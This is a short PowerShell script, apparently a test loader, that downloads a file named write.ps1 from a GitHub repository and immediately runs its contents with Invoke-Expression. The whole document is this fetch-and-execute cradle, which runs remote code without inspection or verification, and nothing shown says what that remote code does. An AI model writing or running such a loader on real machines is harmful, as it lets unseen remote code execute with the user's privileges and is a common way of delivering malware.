$remoteURL = "https://github.com/filly-spud/Testing/raw/main/write.ps1"       
$remoteCode = (Invoke-WebRequest -Uri $remoteURL -UseBasicParsing) 
Invoke-Expression -Command $remoteCode
